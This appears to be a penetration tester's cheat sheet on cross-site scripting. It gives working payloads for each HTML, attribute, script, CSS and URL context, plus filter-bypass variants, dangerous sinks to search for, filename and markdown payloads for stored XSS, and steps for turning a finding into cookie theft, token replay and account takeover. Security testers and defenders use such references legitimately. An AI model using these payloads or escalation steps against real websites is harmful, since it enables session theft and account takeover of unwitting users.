# Cross-Site Scripting

XSS is a context problem. The payload is trivial; finding the context and the escape is
the work.

---

## Contexts and escapes

| Context | Example | Escape |
|---|---|---|
| HTML text | `<p>HERE</p>` | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` |
| Attribute, double-quoted | `value="HERE"` | `" onmouseover="alert(1)` |
| Attribute, single-quoted | `value='HERE'` | `' onmouseover='alert(1)` |
| Unquoted attribute | `value=HERE` | `x onmouseover=alert(1)` |
| `href`/`src` | `href="HERE"` | `javascript:alert(1)` |
| Inside `<script>` | `var a="HERE"` | `";alert(1);//` |
| Inside `<script>` JSON | `{"a":"HERE"}` | `</script><script>alert(1)</script>` |
| Inside a comment | `<!-- HERE -->` | `--><script>alert(1)</script>` |
| Inside `<textarea>` | `<textarea>HERE</textarea>` | `</textarea><script>alert(1)</script>` |
| Inside `<title>` | | `</title><script>alert(1)</script>` |
| CSS | `style="HERE"` | `expression(alert(1))`, `url(javascript:...)` |

---

## Determine the context mechanically

1. Send a unique marker: `aaaXaaa`.
2. View source (not devtools — devtools shows the post-parse DOM).
3. Note exactly where the marker lands and what surrounds it.
4. Note which characters survive: `<` `>` `"` `'` `&` `\` `` ` ``.
5. Build the minimal escape for that context.

---

## Filter bypass

- Tag blocked → `<svg/onload=>`, `<details open ontoggle=>`, `<body onpageshow=>`.
- `alert` blocked → `` alert`1` ``, `confirm(1)`, `print()`, `top['alert'](1)`.
- Parentheses blocked → `` alert`1` ``, `onerror=alert;throw 1`.
- Quotes blocked → unquoted attribute, backtick template literal.
- `<` blocked → `&lt;` in some contexts, or a `javascript:` URL.
- Space blocked → `/`, `%09`, `%0a`, `/**/`.
- `script` blocked → `<scr<script>ipt>`, `<img src=x onerror=...>`.

---

## Sinks to grep for

```
innerHTML  outerHTML  document.write  insertAdjacentHTML  eval  setTimeout(string)
jQuery.html()  .append()  angular [innerHTML]  v-html  dangerouslySetInnerHTML
```

In JS bundles: `postMessage` handlers, `location.hash` parsing, `new Function`.

---

## DOM XSS

Source → sink. Sources: `location`, `document.referrer`, `window.name`, `postMessage`,
`localStorage`. Sinks as above. Test by putting the payload in the fragment (`#`) and
watching the DOM.

`postMessage` without an `origin` check is a finding even without a payload.

---

## Stored XSS

- Profile fields, comments, support tickets, filenames, CSV imports, markdown.
- Check the *rendering* surface, not the input surface: an admin panel, an export, a PDF.
- Filename XSS: `"><img src=x onerror=alert(1)>.png`.
- Markdown: `[x](javascript:alert(1))`, `![x](x"onerror="alert(1))`.

---

## Impact escalation

`alert(1)` is not impact. Show:

- `document.cookie` (if not HttpOnly)
- `localStorage` token → replay it
- CSRF token theft → perform an action
- Account takeover via email change
- Admin-panel XSS → mass action

---

## Go deeper

1. Test the mobile webview — `javascript:` bridges and `addJavascriptInterface` matter.
2. Test the PDF/email rendering of the same field (different parser).
3. Test CSP: is it report-only? Any `unsafe-inline`? Any allowed CDN with a JSONP endpoint?
4. Test mutation XSS (`<noscript>`, `<template>`, `<math>`) where the sanitizer re-parses.
5. Test the sanitizer's parser differential — DOMPurify version, `mXSS` payloads.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
